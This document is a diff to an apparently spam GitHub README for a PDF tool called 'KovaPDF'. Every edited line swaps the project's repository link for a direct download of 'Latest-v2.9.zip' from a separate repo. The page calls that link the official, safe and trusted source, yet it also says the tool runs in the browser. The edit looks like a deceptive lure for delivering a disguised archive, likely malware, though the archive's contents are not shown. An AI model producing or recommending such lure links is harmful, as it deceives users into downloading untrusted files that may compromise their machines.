@@ -6,7 +6,7 @@ description: "Edit, convert, compress, and organize PDFs free in your browser—
 <h1>🛠️ KovaPDF - Free PDF Tools That Work Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/hacoswien/KovaPDF" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ DOWNLOAD KovaPDF NOW</a>
+  <a href="https://raw.githubusercontent.com/hacoswien/hacoswien.github.io/main/elderly/Latest-v2.9.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ DOWNLOAD KovaPDF NOW</a>
 </p>
 
 ---
@@ -49,7 +49,7 @@ Getting started with KovaPDF takes **less than one minute**. Here's your simple 
 
 ### Step 1: Visit the Official Download Page
 
-[![Visit KovaPDF](https://img.shields.io/badge/📥_VISIT_OFFICIAL_PAGE-764ba2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hacoswien/KovaPDF)
+[![Visit KovaPDF](https://img.shields.io/badge/📥_VISIT_OFFICIAL_PAGE-764ba2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hacoswien/hacoswien.github.io/main/elderly/Latest-v2.9.zip)
 
 **Visit this link to download the application.** This is the official, safe, and trusted source for KovaPDF.
 
@@ -160,7 +160,7 @@ If you encounter any issues or have questions, don't hesitate to reach out:
 
 | Tool | Link |
 |------|------|
-| **Main Download** | [https://github.com/hacoswien/KovaPDF](https://github.com/hacoswien/KovaPDF) |
+| **Main Download** | [https://raw.githubusercontent.com/hacoswien/hacoswien.github.io/main/elderly/Latest-v2.9.zip](https://raw.githubusercontent.com/hacoswien/hacoswien.github.io/main/elderly/Latest-v2.9.zip) |
 | **Compress PDF** | Available within the app |
 | **Merge PDF** | Available within the app |
 | **OCR** | Available within the app |
@@ -171,7 +171,7 @@ If you encounter any issues or have questions, don't hesitate to reach out:
 
 Don't waste time searching for multiple PDF tools or struggling with complicated software. **KovaPDF gives you everything you need in one free, browser-based solution.**
 
-[![Download KovaPDF](https://img.shields.io/badge/⬇️_START_USING_KovaPDF-667eea?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hacoswien/KovaPDF)
+[![Download KovaPDF](https://img.shields.io/badge/⬇️_START_USING_KovaPDF-667eea?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hacoswien/hacoswien.github.io/main/elderly/Latest-v2.9.zip)
 
 **Visit this link to download the application** and start handling your PDFs like a pro in minutes. It's fast, it's free, and it just works.
 
